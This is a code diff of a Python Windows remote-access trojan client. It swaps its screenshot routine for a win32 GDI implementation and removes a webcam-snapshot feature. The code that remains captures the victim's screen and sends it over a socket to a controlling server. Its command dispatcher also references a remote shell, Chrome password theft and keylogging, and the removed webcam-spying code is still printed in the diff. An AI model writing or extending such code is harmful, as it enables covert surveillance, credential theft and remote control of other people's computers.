@@ -1,6 +1,5 @@
-import socket, os, sys, platform, pyautogui, time, ctypes, subprocess, webbrowser, sqlite3
-import win32console, win32gui, win32api, winerror, win32event, win32crypt
-import pygame.camera, pygame.image
+import socket, os, sys, platform, time, ctypes, subprocess, webbrowser, sqlite3
+import win32console, win32gui, win32api, winerror, win32event, win32crypt, win32con, win32ui
 import urllib.request
 from shutil import copyfile
 from winreg import *
@@ -61,7 +60,6 @@ def recvall(buffer):  # function to receive large amounts of data
 
 
 def msg(data):
-    # use ctypes to create messagebox instead of tkinter to save on dependencies
     strMsg = data[3:len(data)]
     MessageBox(strMsg)
 
@@ -90,28 +88,38 @@ def info():
 
 
 def screenshot():
-    pyautogui.screenshot().save(TMP + "/s.png")  # take screenshot
+    desktop_handle = win32gui.GetDesktopWindow()  # get a handle to the desktop
+    '''
+    arrScr[0] = width
+    arrScr[1] = height
+    arrScr[2] = left
+    arrScr[3] = top
+    '''
+    arrScr = [win32api.GetSystemMetrics(win32con.SM_CXVIRTUALSCREEN),
+                            win32api.GetSystemMetrics(win32con.SM_CYVIRTUALSCREEN),
+                            win32api.GetSystemMetrics(win32con.SM_XVIRTUALSCREEN),
+                            win32api.GetSystemMetrics(win32con.SM_YVIRTUALSCREEN)]
+
+    desktop_device_context = win32gui.GetWindowDC(desktop_handle)
+    img_device_context = win32ui.CreateDCFromHandle(desktop_device_context)
+
+    memory_device_context = img_device_context.CreateCompatibleDC()
+
+    # create bitmap object to store screenshot
+    screenshot = win32ui.CreateBitmap()
+    screenshot.CreateCompatibleBitmap(img_device_context, arrScr[0], arrScr[1])
+    memory_device_context.SelectObject(screenshot)
+
+    # copy screen into memory device context
+    memory_device_context.BitBlt((0, 0), (arrScr[0], arrScr[1]), img_device_context, (arrScr[2], arrScr[3]), win32con.SRCCOPY)
+
+    # save screenshot and free objects
+    screenshot.SaveBitmapFile(memory_device_context, TMP + "/s.png")
+    memory_device_context.DeleteDC()
+    win32gui.DeleteObject(screenshot.GetHandle())
+
+    # send screenshot information to server
     objSocket.send(str.encode("Receiving Screenshot" + "\n" + "File size: " + str(os.path.getsize(TMP + "/s.png"))
-                              + " bytes" + "\n" + "Please wait..."))
-    objPic = open(TMP + "/s.png", "rb")  # send file contents and close the file
-    time.sleep(1)
-    objSocket.send(objPic.read())
-    objPic.close()
-
-
-def webcam_pic():
-    try:
-        pygame.camera.init()
-        objCam = pygame.camera.Camera(pygame.camera.list_cameras()[0])  # get default webcam
-        objCam.start()
-        pygame.image.save(objCam.get_image(), TMP + "/s.png")
-        pygame.camera.quit()
-        objCam.stop()
-    except:
-        objSocket.send(str.encode("error"))
-        return
-
-    objSocket.send(str.encode("Receiving Snapshot" + "\n" + "File size: " + str(os.path.getsize(TMP + "/s.png"))
                               + " bytes" + "\n" + "Please wait..."))
     objPic = open(TMP + "/s.png", "rb")  # send file contents and close the file
     time.sleep(1)
@@ -392,8 +400,6 @@ try:
             continue
         elif strData == "cmd":
             command_shell()
-        elif strData == "webpic":
-            webcam_pic()
         elif strData == "chrpass":
             chrpass()
         elif strData == "keystart":
